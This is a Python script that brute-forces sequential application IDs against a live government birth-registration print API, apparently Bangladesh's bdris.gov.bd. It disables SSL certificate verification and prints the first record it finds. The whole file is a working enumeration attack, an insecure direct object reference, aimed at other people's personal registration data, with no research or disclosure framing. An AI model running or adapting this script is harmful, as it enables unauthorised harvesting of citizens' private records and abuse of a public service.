import requests
import urllib3

# Disable SSL certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# User inputs
try:
    start_id = int(input("Start AppId No: "))
    end_id = int(input("End AppId No: "))
    date = input("What is the Date [dd/mm/YYYY]: ")
except ValueError:
    print("❌ Invalid input. Please enter numbers for App IDs.")
    exit()

# Validate range
if start_id > end_id:
    print("❌ Start AppId must be less than or equal to End AppId.")
    exit()

# API endpoint
url = "https://bdris.gov.bd/api/br/application/print"

# Loop through appId range
for app_id in range(start_id, end_id + 1):
    params = {
        "appId": str(app_id),
        "date": date
    }

    print(f"\n🔍 Checking App ID: {app_id}...")

    try:
        response = requests.get(url, params=params, verify=False)
        status = response.status_code

        print("📡 Status Code:", status)

        if status == 200:
            print("✅ Valid App ID Found!")
            print("📝 Response:\n", response.text)
            break  # STOP further requests on success
        else:
            print("⛔ Invalid or no data.")

    except requests.exceptions.RequestException as e:
        print("❌ Request failed:", e)
